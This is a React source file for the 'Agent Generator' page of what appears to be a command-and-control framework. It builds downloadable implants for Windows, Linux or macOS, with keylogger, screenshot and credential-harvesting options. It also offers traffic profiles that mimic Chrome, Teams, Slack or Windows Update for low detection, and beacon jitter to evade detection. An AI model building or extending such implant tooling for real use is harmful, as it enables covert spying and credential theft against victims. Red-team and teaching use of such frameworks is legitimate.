/**
 * Generator Page
 * 
 * Agent generation interface using Factory and Builder patterns.
 * Allows operators to create customized agents for different platforms.
 */

import React, { useState } from 'react';
import { useMutation } from '@tanstack/react-query';
import toast from 'react-hot-toast';
import { 
  Download, 
  Settings, 
  Code,
  Zap,
  Shield,
  AlertTriangle,
  CheckCircle,
  Loader,
  Clock,
  Trash2,
  FileText
} from 'lucide-react';
import { MainLayout } from '../components/layout/MainLayout';
import { generatorApi } from '../lib/api';
import { Button } from '../components/common/Button';
import { Card } from '../components/common/Card';
import type { AgentGenerateRequest } from '../types';

interface GeneratedAgent {
  id: string;
  filename: string;
  platform: string;
  features: string[];
  timestamp: string;
  type: 'executable' | 'python';
}

export function GeneratorPage() {
  const [config, setConfig] = useState<AgentGenerateRequest>({
    platform: 'windows',
    features: [],
    sleep_interval: 60,
    jitter: 0.2,
    c2_server: 'http://192.168.56.1:8000/api/v1/agents',
    encryption_enabled: false,
    profile: 'chrome_browser',
  });

  const [customName, setCustomName] = useState('');
  const [generatedFilename, setGeneratedFilename] = useState<string | null>(null);
  const [generationInfo, setGenerationInfo] = useState<any>(null);
  
  const [history, setHistory] = useState<GeneratedAgent[]>(() => {
    const saved = localStorage.getItem('generation_history');
    return saved ? JSON.parse(saved) : [];
  });

  const generateMutation = useMutation({
    mutationFn: generatorApi.generate,
    onSuccess: (data) => {
      setGenerationInfo(data);
      const fullPath = data.executable || data.python_file;
      const filename = fullPath.split('/').pop()?.split('\\').pop() || fullPath;
      setGeneratedFilename(filename);
      
      const historyItem: GeneratedAgent = {
        id: data.agent_id,
        filename: filename,
        platform: config.platform,
        features: config.features,
        timestamp: new Date().toISOString(),
        type: data.executable ? 'executable' : 'python',
      };
      
      const updatedHistory = [historyItem, ...history].slice(0, 20);
      setHistory(updatedHistory);
      localStorage.setItem('generation_history', JSON.stringify(updatedHistory));
      
      if (data.executable) {
        toast.success(`✅ Executable generated: ${filename}`);
      } else {
        toast.success(`✅ Python file generated: ${filename}`);
        if (data.deployment_note) {
          toast.error('⚠️ Executable build failed - Python file only', { duration: 6000 });
        }
      }
    },
    onError: (error: any) => {
      toast.error(error.response?.data?.detail || 'Failed to generate agent');
    },
  });

  const downloadMutation = useMutation({
    mutationFn: generatorApi.download,
    onSuccess: (blob, filename) => {
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
      toast.success(`📥 Downloaded: ${filename}`);
    },
    onError: () => {
      toast.error('Failed to download agent');
    },
  });

  const handleGenerate = () => {
    const payload: any = {
      platform: config.platform,
      c2_server: config.c2_server,
      features: config.features,
      sleep_interval: config.sleep_interval,
      jitter: config.jitter,
      encryption_enabled: config.encryption_enabled,
      profile: config.profile,
    };
    
    if (customName && customName.trim().length > 0) {
      payload.custom_name = customName.trim();
    }
    
    generateMutation.mutate(payload);
  };

  const handleDownload = (filename?: string) => {
    const fileToDownload = filename || generatedFilename;
    if (fileToDownload) {
      downloadMutation.mutate(fileToDownload);
    }
  };

  const handleDeleteHistory = (id: string) => {
    const updated = history.filter(item => item.id !== id);
    setHistory(updated);
    localStorage.setItem('generation_history', JSON.stringify(updated));
    toast.success('Removed from history');
  };

  const handleClearHistory = () => {
    if (confirm('Clear all generation history?')) {
      setHistory([]);
      localStorage.removeItem('generation_history');
      toast.success('History cleared');
    }
  };

  const toggleFeature = (feature: string) => {
    setConfig(prev => ({
      ...prev,
      features: prev.features.includes(feature)
        ? prev.features.filter(f => f !== feature)
        : [...prev.features, feature]
    }));
  };

  const platforms = [
    { value: 'windows', label: 'Windows', icon: '🪟', description: 'Windows 10/11 (x64)' },
    { value: 'linux', label: 'Linux', icon: '🐧', description: 'Ubuntu/Debian/RHEL' },
    { value: 'macos', label: 'macOS', icon: '🍎', description: 'macOS 10.15+' },
  ];

  const availableFeatures = [
    { value: 'screenshot', label: 'Screenshot', icon: '📸', description: 'Capture screenshots' },
    { value: 'keylogger', label: 'Keylogger', icon: '⌨️', description: 'Record keystrokes' },
    { value: 'credentials', label: 'Credentials', icon: '🔑', description: 'Harvest credentials (Windows only)' },
  ];

  return (
    <MainLayout>
      <div className="space-y-8">
        <div>
          <h1 className="text-3xl font-bold text-dark-900 mb-2">Agent Generator</h1>
          <p className="text-dark-600">Create customized agents using Factory and Builder patterns</p>
        </div>

        <Card className="bg-yellow-50 border-yellow-200">
          <div className="flex items-start gap-3">
            <AlertTriangle className="w-6 h-6 text-yellow-600 flex-shrink-0 mt-0.5" />
            <div>
              <h3 className="font-semibold text-yellow-900 mb-1">Educational Use Only</h3>
              <p className="text-sm text-yellow-800">
                Generated agents are for authorized testing in controlled environments only. 
                Unauthorized use is illegal and unethical.
              </p>
            </div>
          </div>
        </Card>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2 space-y-6">
            <Card>
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 bg-blue-500/10 rounded-lg">
                  <Settings className="w-5 h-5 text-blue-600" />
                </div>
                <h2 className="text-xl font-semibold text-dark-900">Platform</h2>
              </div>

              <div className="grid grid-cols-3 gap-4">
                {platforms.map(platform => (
                  <button
                    key={platform.value}
                    onClick={() => setConfig(prev => ({ ...prev, platform: platform.value as any }))}
                    className={`p-4 rounded-lg border-2 transition-all text-center ${
                      config.platform === platform.value
                        ? 'border-primary-500 bg-primary-500'
                        : 'border-dark-200 bg-dark-50 hover:border-dark-300'
                    }`}
                  >
                    <div className="text-4xl mb-2">{platform.icon}</div>
                    <div className={`font-semibold ${config.platform === platform.value ? 'text-white' : 'text-dark-900'}`}>
                      {platform.label}
                    </div>
                    <div className={`text-xs mt-1 ${config.platform === platform.value ? 'text-primary-100' : 'text-dark-600'}`}>
                      {platform.description}
                    </div>
                  </button>
                ))}
              </div>
            </Card>

            <Card>
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 bg-purple-500/10 rounded-lg">
                  <Zap className="w-5 h-5 text-purple-600" />
                </div>
                <h2 className="text-xl font-semibold text-dark-900">Features</h2>
              </div>

              <div className="space-y-3">
                {availableFeatures.map(feature => (
                  <label
                    key={feature.value}
                    className={`flex items-start gap-4 p-4 rounded-lg border-2 cursor-pointer transition-all ${
                      config.features.includes(feature.value)
                        ? 'border-primary-500 bg-primary-500'
                        : 'border-dark-200 bg-dark-50 hover:border-dark-300'
                    }`}
                  >
                    <input
                      type="checkbox"
                      checked={config.features.includes(feature.value)}
                      onChange={() => toggleFeature(feature.value)}
                      className="mt-1 w-5 h-5 text-primary-600 rounded focus:ring-2 focus:ring-primary-500"
                    />
                    <div className="flex-1">
                      <div className="flex items-center gap-2">
                        <span className="text-xl">{feature.icon}</span>
                        <span className={`font-semibold ${config.features.includes(feature.value) ? 'text-white' : 'text-dark-900'}`}>
                          {feature.label}
                        </span>
                      </div>
                      <p className={`text-sm mt-1 ${config.features.includes(feature.value) ? 'text-primary-100' : 'text-dark-600'}`}>
                        {feature.description}
                      </p>
                    </div>
                  </label>
                ))}
              </div>
            </Card>

            <Card>
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 bg-cyan-500/10 rounded-lg">
                  <Shield className="w-5 h-5 text-cyan-600" />
                </div>
                <h2 className="text-xl font-semibold text-dark-900">Malleable C2 Profile</h2>
              </div>

              <div className="space-y-3">
                <div
                  onClick={() => setConfig(prev => ({ ...prev, profile: 'chrome_browser' }))}
                  className={`p-4 rounded-lg border-2 cursor-pointer transition-all ${
                    config.profile === 'chrome_browser'
                      ? 'border-cyan-500 bg-cyan-500 text-white'
                      : 'border-dark-200 bg-dark-50 hover:border-dark-300'
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <span className="text-2xl">🌐</span>
                    <div>
                      <p className={`font-semibold ${config.profile === 'chrome_browser' ? 'text-white' : 'text-dark-900'}`}>
                        Chrome Browser
                      </p>
                      <p className={`text-sm ${config.profile === 'chrome_browser' ? 'text-cyan-50' : 'text-dark-600'}`}>
                        Mimics Chrome browser traffic (Low detection risk)
                      </p>
                    </div>
                  </div>
                </div>

                <div
                  onClick={() => setConfig(prev => ({ ...prev, profile: 'microsoft_teams' }))}
                  className={`p-4 rounded-lg border-2 cursor-pointer transition-all ${
                    config.profile === 'microsoft_teams'
                      ? 'border-cyan-500 bg-cyan-500 text-white'
                      : 'border-dark-200 bg-dark-50 hover:border-dark-300'
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <span className="text-2xl">💼</span>
                    <div>
                      <p className={`font-semibold ${config.profile === 'microsoft_teams' ? 'text-white' : 'text-dark-900'}`}>
                        Microsoft Teams
                      </p>
                      <p className={`text-sm ${config.profile === 'microsoft_teams' ? 'text-cyan-50' : 'text-dark-600'}`}>
                        APT29-observed profile (Corporate environments)
                      </p>
                    </div>
                  </div>
                </div>

                <div
                  onClick={() => setConfig(prev => ({ ...prev, profile: 'slack' }))}
                  className={`p-4 rounded-lg border-2 cursor-pointer transition-all ${
                    config.profile === 'slack'
                      ? 'border-cyan-500 bg-cyan-500 text-white'
                      : 'border-dark-200 bg-dark-50 hover:border-dark-300'
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <span className="text-2xl">💬</span>
                    <div>
                      <p className={`font-semibold ${config.profile === 'slack' ? 'text-white' : 'text-dark-900'}`}>
                        Slack
                      </p>
                      <p className={`text-sm ${config.profile === 'slack' ? 'text-cyan-50' : 'text-dark-600'}`}>
                        Enterprise chat client (Tech companies)
                      </p>
                    </div>
                  </div>
                </div>

                <div
                  onClick={() => setConfig(prev => ({ ...prev, profile: 'windows_update' }))}
                  className={`p-4 rounded-lg border-2 cursor-pointer transition-all ${
                    config.profile === 'windows_update'
                      ? 'border-cyan-500 bg-cyan-500 text-white'
                      : 'border-dark-200 bg-dark-50 hover:border-dark-300'
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <span className="text-2xl">🔄</span>
                    <div>
                      <p className={`font-semibold ${config.profile === 'windows_update' ? 'text-white' : 'text-dark-900'}`}>
                        Windows Update
                      </p>
                      <p className={`text-sm ${config.profile === 'windows_update' ? 'text-cyan-50' : 'text-dark-600'}`}>
                        System traffic (VERY LOW detection risk)
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </Card>

            <Card>
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 bg-orange-500/10 rounded-lg">
                  <FileText className="w-5 h-5 text-orange-600" />
                </div>
                <h2 className="text-xl font-semibold text-dark-900">Agent Name (Optional)</h2>
              </div>

              <div>
                <input
                  type="text"
                  value={customName}
                  onChange={(e) => setCustomName(e.target.value)}
                  placeholder="my-custom-agent (leave empty for auto-generated name)"
                  className="w-full px-4 py-2 bg-dark-100 border border-dark-200 rounded-lg text-dark-900 focus:outline-none focus:ring-2 focus:ring-primary-500"
                />
                <p className="text-xs text-dark-600 mt-2">Optional custom name for the generated agent file</p>
              </div>
            </Card>

            <Card>
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 bg-green-500/10 rounded-lg">
                  <Code className="w-5 h-5 text-green-600" />
                </div>
                <h2 className="text-xl font-semibold text-dark-900">Configuration</h2>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-dark-700 mb-2">C2 Server URL</label>
                  <input
                    type="text"
                    value={config.c2_server}
                    onChange={(e) => setConfig(prev => ({ ...prev, c2_server: e.target.value }))}
                    className="w-full px-4 py-2 bg-dark-100 border border-dark-200 rounded-lg text-dark-900 focus:outline-none focus:ring-2 focus:ring-primary-500"
                    placeholder="http://192.168.56.1:8000/api/v1/agents"
                  />
                  <p className="text-xs text-dark-600 mt-1">Full URL to the /beacon endpoint</p>
                </div>

                <div>
                  <label className="block text-sm font-medium text-dark-700 mb-2">
                    Beacon Interval: {config.sleep_interval} seconds
                  </label>
                  <input
                    type="range"
                    min="10"
                    max="300"
                    step="10"
                    value={config.sleep_interval}
                    onChange={(e) => setConfig(prev => ({ ...prev, sleep_interval: parseInt(e.target.value) }))}
                    className="w-full h-2 bg-dark-200 rounded-lg appearance-none cursor-pointer"
                  />
                  <div className="flex justify-between text-xs text-dark-600 mt-1">
                    <span>10s (Fast)</span>
                    <span>300s (Slow)</span>
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-dark-700 mb-2">
                    Jitter: {(config.jitter * 100).toFixed(0)}%
                  </label>
                  <input
                    type="range"
                    min="0"
                    max="0.5"
                    step="0.05"
                    value={config.jitter}
                    onChange={(e) => setConfig(prev => ({ ...prev, jitter: parseFloat(e.target.value) }))}
                    className="w-full h-2 bg-dark-200 rounded-lg appearance-none cursor-pointer"
                  />
                  <div className="flex justify-between text-xs text-dark-600 mt-1">
                    <span>0% (Predictable)</span>
                    <span>50% (Random)</span>
                  </div>
                  <p className="text-xs text-dark-600 mt-2">Randomizes beacon timing to evade detection</p>
                </div>
              </div>
            </Card>
          </div>

          <div className="space-y-6">
            <Card>
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 bg-primary-500/10 rounded-lg">
                  <Shield className="w-5 h-5 text-primary-600" />
                </div>
                <h2 className="text-xl font-semibold text-dark-900">Summary</h2>
              </div>

              <div className="space-y-3">
                <div className="bg-dark-50 rounded-lg p-3">
                  <p className="text-xs text-dark-600 mb-1">Platform</p>
                  <p className="font-mono text-sm font-semibold text-dark-900 capitalize">{config.platform}</p>
                </div>

                <div className="bg-dark-50 rounded-lg p-3">
                  <p className="text-xs text-dark-600 mb-1">Features</p>
                  <p className="font-mono text-sm font-semibold text-dark-900">{config.features.length} enabled</p>
                  {config.features.length > 0 && (
                    <div className="flex flex-wrap gap-1 mt-2">
                      {config.features.map(feature => (
                        <span key={feature} className="text-xs px-2 py-1 bg-primary-500/10 text-primary-700 rounded">
                          {feature}
                        </span>
                      ))}
                    </div>
                  )}
                </div>

                <div className="bg-dark-50 rounded-lg p-3">
                  <p className="text-xs text-dark-600 mb-1">Profile</p>
                  <p className="font-mono text-sm text-dark-900 capitalize">
                    {config.profile?.replace('_', ' ') || 'chrome browser'}
                  </p>
                </div>

                <div className="bg-dark-50 rounded-lg p-3">
                  <p className="text-xs text-dark-600 mb-1">Beacon</p>
                  <p className="font-mono text-sm text-dark-900">
                    Every {config.sleep_interval}s ±{(config.jitter * 100).toFixed(0)}%
                  </p>
                </div>

                <div className="bg-dark-50 rounded-lg p-3">
                  <p className="text-xs text-dark-600 mb-1">C2 Server</p>
                  <p className="font-mono text-xs text-dark-900 break-all">{config.c2_server}</p>
                </div>
              </div>
            </Card>

            <Card className="bg-gradient-to-br from-primary-500 to-primary-600 text-white">
              <h3 className="font-semibold mb-3">Ready to Generate?</h3>
              <p className="text-sm text-primary-100 mb-4">
                This will create a Python agent file (executable build may take 1-2 minutes).
              </p>
              <Button
                variant="secondary"
                className="w-full bg-white text-primary-600 hover:bg-primary-50"
                onClick={handleGenerate}
                isLoading={generateMutation.isPending}
              >
                {generateMutation.isPending ? (
                  <>
                    <Loader className="w-4 h-4 mr-2 animate-spin" />
                    Generating...
                  </>
                ) : (
                  <>
                    <Zap className="w-4 h-4 mr-2" />
                    Generate Agent
                  </>
                )}
              </Button>
            </Card>

            {generatedFilename && (
              <Card key={generatedFilename} className="bg-green-50 border-green-200">
                <div className="flex items-start gap-3 mb-4">
                  <CheckCircle className="w-6 h-6 text-green-600 flex-shrink-0" />
                  <div>
                    <h3 className="font-semibold text-green-900 mb-1">Agent Generated!</h3>
                    <p className="text-sm text-green-700">Both executable and Python file ready to download</p>
                  </div>
                </div>

                <div className="bg-black rounded-lg p-4 mb-4 border-4 border-yellow-400 shadow-lg">
                  <p className="text-xs font-bold text-yellow-400 mb-2 uppercase tracking-wide">📁 FILENAME</p>
                  <p className="font-mono text-2xl text-yellow-300 break-all font-black leading-tight bg-gradient-to-r from-yellow-400 to-yellow-200 bg-clip-text text-transparent">
                    {generatedFilename}
                  </p>
                  
                  <div className="mt-4 flex flex-wrap gap-2">
                    <span className="text-xs px-3 py-1.5 bg-blue-500 text-white rounded-full font-bold">
                      {generationInfo?.executable ? '🔧 Executable' : '🐍 Python'}
                    </span>
                    {generationInfo?.config && generationInfo.config.features.length > 0 && (
                      <span className="text-xs px-3 py-1.5 bg-purple-500 text-white rounded-full font-bold">
                        {generationInfo.config.features.length} feature{generationInfo.config.features.length !== 1 ? 's' : ''}
                      </span>
                    )}
                    {generationInfo?.config?.profile && (
                      <span className="text-xs px-3 py-1.5 bg-cyan-500 text-white rounded-full font-bold">
                        {generationInfo.config.profile.replace('_', ' ')}
                      </span>
                    )}
                  </div>
                </div>

                <div className="space-y-2">
                  {generationInfo?.executable && (
                    <Button
                      variant="primary"
                      className="w-full bg-green-600 hover:bg-green-700 text-white font-bold"
                      onClick={() => {
                        const baseFilename = generatedFilename.replace('.py', '').replace('.exe', '');
                        handleDownload(`${baseFilename}.exe`);
                      }}
                      isLoading={downloadMutation.isPending}
                    >
                      <Download className="w-4 h-4 mr-2" />
                      Download Executable (.exe) - 20MB
                    </Button>
                  )}
                  
                  <Button
                    variant="secondary"
                    className="w-full border-2 border-blue-500 bg-white hover:bg-blue-50 text-blue-700 font-bold"
                    onClick={() => {
                      const baseFilename = generatedFilename.replace('.py', '').replace('.exe', '');
                      handleDownload(`${baseFilename}.py`);
                    }}
                    isLoading={downloadMutation.isPending}
                  >
                    <Download className="w-4 h-4 mr-2" />
                    Download Python File (.py) - 12KB
                  </Button>
                </div>
                
                {generationInfo && !generationInfo.executable && generationInfo.deployment_note && (
                  <div className="mt-3 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
                    <p className="text-xs text-yellow-800 font-medium">⚠️ {generationInfo.deployment_note}</p>
                  </div>
                )}
              </Card>
            )}

            <Card>
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-gray-500/10 rounded-lg">
                    <Clock className="w-5 h-5 text-gray-600" />
                  </div>
                  <h2 className="text-xl font-semibold text-dark-900">Recent Generations</h2>
                </div>
                {history.length > 0 && (
                  <button onClick={handleClearHistory} className="text-xs text-red-600 hover:text-red-700 font-medium">
                    Clear All
                  </button>
                )}
              </div>

              {history.length === 0 ? (
                <p className="text-sm text-dark-600 text-center py-8">
                  No agents generated yet. Create your first agent to see history.
                </p>
              ) : (
                <div className="space-y-3 max-h-96 overflow-y-auto">
                  {history.map((item) => {
                    const baseFilename = item.filename.replace('.py', '').replace('.exe', '');
                    
                    return (
                      <div key={item.id} className="flex items-center justify-between p-3 bg-dark-50 rounded-lg hover:bg-dark-100 transition-colors">
                        <div className="flex-1 min-w-0">
                          <p className="font-mono text-sm font-bold text-dark-900 truncate">{item.filename}</p>
                          <div className="flex items-center gap-2 mt-1.5">
                            <span className="text-xs px-2 py-0.5 bg-blue-100 text-blue-700 rounded font-medium">
                              {item.platform}
                            </span>
                            <span className="text-xs px-2 py-0.5 bg-green-100 text-green-700 rounded font-medium">
                              {item.type === 'executable' ? '.exe + .py' : '.py file'}
                            </span>
                            <span className="text-xs text-dark-600">
                              {new Date(item.timestamp).toLocaleDateString()}
                            </span>
                          </div>
                        </div>
                        
                        <div className="flex items-center gap-1 ml-4">
                          {item.type === 'executable' && (
                            <button
                              onClick={() => handleDownload(`${baseFilename}.exe`)}
                              className="p-2 text-green-600 hover:bg-green-50 rounded transition-colors"
                              title="Download .exe"
                            >
                              <div className="flex items-center gap-1">
                                <Download className="w-4 h-4" />
                                <span className="text-xs font-bold">.exe</span>
                              </div>
                            </button>
                          )}
                          
                          <button
                            onClick={() => handleDownload(`${baseFilename}.py`)}
                            className="p-2 text-blue-600 hover:bg-blue-50 rounded transition-colors"
                            title="Download .py"
                          >
                            <div className="flex items-center gap-1">
                              <Download className="w-4 h-4" />
                              <span className="text-xs font-bold">.py</span>
                            </div>
                          </button>
                          
                          <button
                            onClick={() => handleDeleteHistory(item.id)}
                            className="p-2 text-red-600 hover:bg-red-50 rounded transition-colors"
                            title="Remove from history"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </Card>
          </div>
        </div>
      </div>
    </MainLayout>
  );
}